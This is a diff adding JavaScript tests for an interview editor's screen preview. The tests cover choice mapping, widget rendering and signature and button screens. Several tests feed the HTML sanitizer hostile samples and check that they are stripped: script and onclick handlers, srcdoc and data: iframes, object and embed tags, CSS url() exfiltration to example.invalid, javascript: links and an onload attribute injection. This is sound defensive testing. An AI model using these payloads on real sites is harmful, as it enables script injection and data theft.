@@ -104,6 +104,11 @@ function fieldLabels(fields) {
   assert.deepStrictEqual(fieldLabels(fields), ['Gender', 'Self-described gender']);
   assert.strictEqual(fields[0].choices.length, 6);
   assert.deepStrictEqual(fields[1]['show if'], { variable: 'users[0].gender', is: 'self-described' });
+
+  const custom = preview.expandALMethod(preview.parseMethodCall(
+    'users[0].gender_fields(choices=[{"key": "x", "label": "Shown"}])'
+  )).fields;
+  assert.deepStrictEqual(custom[0].choices, [{ label: 'Shown', value: 'x' }]);
 }
 
 {
@@ -161,6 +166,21 @@ function fieldLabels(fields) {
     { label: 'Two', value: 'Two' },
   ]);
 
+  const mapped = preview.describeField({ label: 'Role', field: 'role',
+    choices: [
+      { key: 'plaintiff', label: 'Person who started the case' },
+      { label: 'Person responding', key: 'defendant' },
+      { label: 'Other person', value: 'other' },
+      { 'Court clerk': 'clerk' },
+    ],
+  }).fields[0];
+  assert.deepStrictEqual(mapped.choices, [
+    { label: 'Person who started the case', value: 'plaintiff' },
+    { label: 'Person responding', value: 'defendant' },
+    { label: 'Other person', value: 'other' },
+    { label: 'Court clerk', value: 'clerk' },
+  ]);
+
   const note = preview.describeField({ note: 'Read **this** first' }).fields[0];
   assert.strictEqual(note.kind, 'note');
 
@@ -170,6 +190,27 @@ function fieldLabels(fields) {
   const noLabel = preview.describeField({ 'no label': 'anything_else', datatype: 'area' }).fields[0];
   assert.strictEqual(noLabel.noLabel, true);
   assert.strictEqual(noLabel.datatype, 'area');
+}
+
+{
+  const choices = [
+    { key: 'plaintiff', label: 'Person who started the case' },
+    { label: 'Person responding', key: 'defendant' },
+  ];
+  const radio = { question: 'Role?', fields: [{ label: 'Role', field: 'role',
+    choices: choices, 'input type': 'radio', default: 'defendant' }] };
+  for (const widgetStyle of ['native', 'labelauty']) {
+    const html = preview.renderQuestion(radio, { widgetStyle }).html;
+    assert.ok(html.includes('value="plaintiff"'));
+    assert.ok(html.includes('value="defendant" checked="checked"'));
+    assert.ok(html.includes('Person who started the case'));
+    assert.ok(html.includes('Person responding'));
+    assert.ok(!html.includes('>key<'));
+    const dropdown = preview.renderQuestion({ question: 'Role?', fields: [
+      { label: 'Role', field: 'role', choices: choices },
+    ] }, { widgetStyle }).html;
+    assert.ok(dropdown.includes('<option value="plaintiff">Person who started the case</option>'));
+  }
 }
 
 // --- Docassemble markup ------------------------------------------------------
@@ -248,6 +289,31 @@ function fieldLabels(fields) {
   assert.ok(doc.includes('.labelauty({class: "labelauty da-active-invisible dafullwidth"})'));
   assert.ok(doc.includes('<body class="dabody">'));
   assert.ok(doc.includes('data-bs-theme="light"'));
+}
+
+{
+  const block = { question: 'Choose and upload', fields: [
+    { label: 'Agree?', field: 'agree', datatype: 'yesno' },
+    { label: 'Colors', field: 'colors', datatype: 'checkboxes', choices: ['Red', 'Blue'], 'none of the above': 'None' },
+    { label: 'Pick one', field: 'choice', choices: ['One', 'Two'], 'input type': 'radio' },
+    { label: 'Document', field: 'document', datatype: 'file' },
+    { label: 'Documents', field: 'documents', datatype: 'files' },
+  ] };
+  const modern = preview.buildDocument(block, { widgetStyle: 'native' });
+  assert.ok(modern.includes('class="btn btn-primary text-start dalabelauty">Agree?</label>'));
+  assert.ok(modern.includes('class="btn btn-primary text-start dalabelauty">Red</label>'));
+  assert.ok(modern.includes('class="btn btn-primary text-start dalabelauty">One</label>'));
+  assert.ok(modern.includes('type="file" class="form-control"'));
+  assert.ok(modern.includes('type="file" class="form-control" name="dapv_field_4" id="dapv_field_4" multiple'));
+  assert.ok(!modern.includes('data-labelauty='));
+  assert.ok(!modern.includes('/static/labelauty/'));
+  assert.ok(!modern.includes('.labelauty('));
+
+  const legacy = preview.buildDocument(block, { widgetStyle: 'labelauty' });
+  assert.ok(legacy.includes('type="file" class="dafile"'));
+  assert.ok(legacy.includes('data-labelauty="Agree?|Agree?"'));
+  assert.ok(!legacy.includes('class="btn btn-primary text-start dalabelauty">Agree?</label>'));
+  assert.ok(legacy.includes('/static/labelauty/source/jquery-labelauty.min.js'));
 }
 
 {
@@ -401,8 +467,8 @@ function fieldLabels(fields) {
 }
 
 {
-  // Scripts are the exception: the preview frame shares an origin with the
-  // editor, so author JavaScript is left out and the omission is reported.
+  // Scripts are the exception: the opaque-origin preview leaves author
+  // JavaScript out, and srcdoc is stripped to prevent nested-frame escapes.
   const rendered = preview.renderQuestion({
     question: 'Q',
     subquestion: '<div class="alert">Hi<script>parent.location="/gone"</script></div>',
@@ -414,6 +480,35 @@ function fieldLabels(fields) {
 
   const handler = preview.sanitizeHtml('<div onclick="steal()" class="a">x</div>');
   assert.strictEqual(handler, '<div class="a">x</div>');
+  const nestedFrame = preview.sanitizeHtml(
+    '<iframe srcdoc="&lt;script&gt;window.top.steal()&lt;/script&gt;"></iframe>'
+  );
+  assert.ok(!nestedFrame.includes('srcdoc='));
+  const nestedDataFrame = preview.sanitizeHtml(
+    '<div class="alert">Safe text</div>' +
+      '<iframe src="data:text/html,%3Cscript%3Eparent.steal()%3C%2Fscript%3E">fallback</iframe>' +
+      '<object data="data:text/html,%3Cscript%3Eparent.steal()%3C%2Fscript%3E"></object>' +
+      '<embed src="data:text/html,%3Cscript%3Eparent.steal()%3C%2Fscript%3E">' +
+      '<link rel="stylesheet" href="https://example.invalid/steal.css"><base href="https://example.invalid/">'
+  );
+  assert.ok(nestedDataFrame.includes('<div class="alert">Safe text</div>'));
+  assert.ok(!/<\/?(?:iframe|object|embed|link|base)\b/i.test(nestedDataFrame));
+  const cssExfil = preview.sanitizeHtml(
+    '<style>@import url("https://example.invalid/steal.css"); ' +
+      'input[value^="SECRET"] { background: url("https://example.invalid/leak") }</style>' +
+      '<div class="alert" style="background-image:url(https://example.invalid/leak)">Safe text</div>',
+    {}
+  );
+  assert.ok(!/<\/?style\b/i.test(cssExfil));
+  assert.ok(!/\sstyle\s*=/i.test(cssExfil));
+  assert.ok(cssExfil.includes('<div class="alert">Safe text</div>'));
+  const embedded = preview.renderQuestion({
+    question: 'Q',
+    subquestion: '<style>input[value^="SECRET"]{background:url(https://example.invalid/leak)}</style>' +
+      '<iframe src="data:text/html,%3Cscript%3Eparent.steal()%3C%2Fscript%3E"></iframe>',
+    fields: [],
+  });
+  assert.ok(embedded.notes.some((n) => n.includes('user-defined CSS')));
   assert.strictEqual(preview.sanitizeHtml('<a href="javascript:evil()">x</a>'), '<a href="">x</a>');
 }
 
@@ -899,4 +994,46 @@ const TABLE_BLOCK = {
 
 process.on('exit', function (code) {
   if (code === 0) console.log('editor_screen_preview.js checks passed');
+});
+
+// Standalone screen controls must not masquerade as empty fields screens.
+{
+  const result = preview.renderQuestion({question: 'Please sign', signature: 'x.signature',
+    subquestion: 'I agree.', under: '**Signer**', required: false, 'pen color': '#33f'});
+  assert.ok(result.html.includes('id="dasigcontent"'));
+  assert.ok(result.html.includes('Signature pad (optional)'));
+  assert.ok(result.html.includes('stroke="#33f"'));
+  assert.ok(result.html.includes('<strong>Signer</strong>'));
+  assert.ok(result.html.includes('dasigclear'));
+  assert.ok(result.html.includes('d-block d-sm-none'));
+  assert.ok(!result.notes.some(note => note.includes('no fields')));
+  const dynamic = preview.renderQuestion({question: 'Sign', signature: 'x.signature', 'pen color': '${ ink }'});
+  assert.ok(dynamic.notes.some(note => note.includes('pen color')));
+  const unsafe = preview.renderQuestion({question: 'Sign', signature: 'sig', 'pen color': 'red" onload="alert(1)'});
+  assert.ok(!unsafe.html.includes('onload='));
+  assert.ok(unsafe.html.includes('stroke="black"'));
+}
+['yesno', 'noyes', 'yesnomaybe', 'noyesmaybe'].forEach(kind => {
+  const result = preview.renderQuestion({question: 'Agree?', [kind]: 'answer'});
+  assert.ok(result.html.includes('>Yes</button>'));
+  assert.ok(result.html.includes('>No</button>'));
+  assert.strictEqual(result.html.includes('I don’t know'), kind.includes('maybe'));
+  assert.ok(!result.html.includes('>Continue</button>'));
+});
+{
+  const result = preview.renderQuestion({question: 'Choose', buttons: [
+    {url: 'https://example.com', Exit: 'exit'},
+    {label: 'Agree', value: true, color: 'success'},
+    {code: 'make_buttons()'},
+  ]});
+  assert.ok(result.html.includes('>Exit</button>'));
+  assert.ok(result.html.includes('btn-success'));
+  assert.ok(!result.html.includes('>Continue</button>'));
+  assert.ok(result.notes.some(note => note.includes('generated by code')));
+}
+['choices', 'dropdown', 'combobox'].forEach(kind => {
+  const result = preview.renderQuestion({question: 'Pick one', field: 'answer', [kind]: ['First', 'Second']});
+  assert.strictEqual(result.fieldCount, 1);
+  assert.ok(result.html.includes('First'));
+  assert.ok(result.html.includes('Second'));
 });
